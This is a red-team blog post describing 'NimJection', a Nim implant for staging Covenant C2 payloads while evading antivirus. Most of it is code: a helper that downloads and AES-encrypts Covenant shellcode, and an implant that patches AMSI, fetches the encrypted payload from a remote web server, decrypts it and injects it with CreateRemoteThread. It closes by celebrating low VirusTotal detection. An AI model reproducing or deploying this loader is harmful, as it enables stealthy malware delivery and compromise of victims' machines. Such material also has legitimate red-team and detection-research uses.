---
title: "NimJection"
categories:
  - Blog
tags:
  - NIM
  - Covenant
  - Red Teaming
---

Playing around with NIM for use as a covenant staging implant/AV evasion

So recently my twitter feed has been full of different people mentioning NIM and its virtues for you in staging implants for AV evasion - so I thought I’d have play with it over a weekend and see if I could get a workflow working for use with Covenant C2.

To start with, anyone interesting in using NIM offensively needs to look at Marcello Salvati’s [OffensiveNim]([ https://github.com/byt3bl33d3r/OffensiveNim]) repository. I would have been fully lost in the woods without it and ended up using a number of his templates for my final tooling – as you will see if you continue reading, I utilised it a lot…

The first step I took was to construct a quick POC to work out the manual workflow of injecting a Covenant stager using NIM. Handily this isn’t too hard as Covenant now comes with a DonutShellcode launcher, so I downloaded the resulting .bin file then used the PowerShell script created by [s3cur3th1ssh1t]([ https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/]) to create an appliable byte array.


![PowershellArray] ({{site.url}}/assets/posts/nimjection/powershell.png)

Using the shellcode.nim template file in the OffensiveNim repo I then simply replaced the current shellcode with the above byte array shellcode.


![shellcode] ({{site.url}}/assets/posts/nimjection/shellcode.png)

Compiling and running proves that the general POC process works, even if it is long winded.

```
nim c Shellcode.nim
```

![shellcode.exe] ({{site.url}}/assets/posts/nimjection/shellcode.exe.png)

An additional issue with this is, whilst utilising NIM does reduce the AV detection rate, it’s far from what I’d call stealthy.

![shellcodeVT] ({{site.url}}/assets/posts/nimjection/shellcodeVT.png)

The above instantly raised a few issue/considerations – even if I could streamline the workflow of creating a stager to execute the covenant shellcode, it’s going to get flagged by a lot of AV. The solution – encryption. In addition to encrypting/decrypting the Covenant shellcode, I decided I also wanted the added flexibility to grab both the initial Covenant shellcode as well as the encrypted payload either locally or from a hosted web server.

The rough workflow I therefore came up with was to create 2 applications:
1.	A helper program (PrepPayload) to take the standard Covenant shellcode, encrypt it and output a text file for the dropped implant.
2.	An implant file to drop on to a target (NimJection). Takes the output file from PrePayload, decrypts it and executes the resulting shellcode in memory.

I’ve outlined a rough overview of the various stages of the code below – I’m about as far from an expert in coding as possible so there’s definitely better ways to do things.

## Stage 1 – Grabbing the b64 Covenant Shellcode

This was a relatively easy stage apart from one issue – SSL. I experienced a lot of issues trying to get SSL to work on Windows when I’d cross compiled the nim executable on Unix. In the end I couldn’t find a decent solution for this – so I just stuck with compiling what I wanted to use on Windows on Windows.

### httprequest.nim
Simple nim script adapted from the OffensiveNim repo to take a URL and return the associated content.
```
import httpclient

proc httpRequest*(URL = ""): string =

    echo "[*] Using httpclient"
    var client = newHttpClient()
    return client.getContent(URL)
```

Reading from a file was even simpler
```
Var b64Payload = readFile(a.val)
```
With a.val being the file path passed from the cmdline.


## Stage 2 - Encryption
The resulting b64 decoded shellcode and encryption key (passed via cmdline) were then encrypted and written out to a file using minorly adapted version of the OffensiveNim encrypt_decrypt template – are you getting a pattern here.

### encrypt.nim

```
proc encrypt*(plaintext: seq[byte], envkey = ""): void =
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        enctext = newSeq[byte](len(plaintext))

    # Create Random IV
    discard randomBytes(addr iv[0], 16)

    # Expand key to 32 bytes using SHA256 as the KDF
    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

    ectx.init(key, iv)
    ectx.encrypt(plaintext, enctext)
    ectx.clear()

    echo "IV: ", toHex(iv)
    echo "ENKEY: ", envkey

    var lines = [toHex(iv) ,toHex(enctext)]
    let f = open("encrypt.txt", fmWrite)

    for line in lines:
        f.writeLine(line)

    f.close()
    echo "ENCRYPTED PAYLOAD: ./encrypt.txt"
    echo "PAYLOAD SIZE = " & $(len(plaintext)) & " - Check decrypt.nim dectext and return array size matches"
```

With the overall workflow working like this:
```
for a in f:
    if a.key == "url":
        echo "Grabbing payload from: " & a.val

        if f[f.high].key == "enkey":
            enkey = f[f.high].val
        else:
            enkey = "Nimjection"

        b64Payload = httpRequest(a.val)
        shellcode = toByteSeq(decode(b64Payload))
        echo "Encrypting Payload..."
        encrypt(shellcode, enkey)
```
Where ‘f’ is a sequence of command line arguments. And that’s all there is to the PrepPayload really.


## Stage 3 Grab and Decrypt shellcode

Grabbing the shellcode and decrypting was simply a case of reusing the code I’d already adempted – and in the case of decryption just altering it slightly.

### decrypt.nim
```
import nimcrypto
import nimcrypto/sysrand
import strutils

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc decrypt*(envkey = "", payload = ""): array[43132,byte] =

    var
        dctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        dectext: array[43132,byte]
        iv = nimcrypto.fromHex(splitLines(payload)[0])
        enctext = nimcrypto.fromHex(splitLines(payload)[1])
    

    var expandedkey = sha256.digest(envkey)
    copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()
    
    return dectext
```
One issue I did encounter was the fact that when you declare a byte array in nim, you need to declare it’s size before its compiled. While this doesn’t cause a big issue at the moment, should someday the shellcode size increase it will cause issues. To help with this I’ve added an extra info line to PrepPayload which tells you the array size of the encrypted shellcode. If it differs from 43132, the following will need to be changed accordingly

```
proc decrypt*(envkey = "", payload = ""): array[43132,byte] =
```
```
dectext: array[43132,byte]
```

I’m sure there’s an elegant way around this by changing how the shellcode injection procedure works so it uses sequences – but I haven’t got there yet.


## Stage 4 Inject and execute
This was the simplest stage out of everything as the OffensiveNim repo already has template code for this which has the relevant code separated out into a procedure.

The final code workflow looks like this:
```
for a in f:
        if a.key == "url":
            var success = PatchAmsi()
            echo "[*] AMSI disabled: ",success

            if f[f.high].key == "enkey":
                enkey = f[f.high].val
            else:
                echo "No encryption key set...."
                break
            
            echo "Grabbing payload from: " & a.val
            echo "Decrypting payload..."
            injectCreateRemoteThread(decrypt(enkey, httpRequest(a.val)))
            break
```
I decided to throw in some AMSI bypassing just because – template code is also on OffensiveNim repo.

## and the result is…..


2 AV hits – I’ll take that. Especially as changing variable names etc from those in the standard templated might reduce that more.

![VT] ({{site.url}}/assets/posts/nimjection/VT2.png)







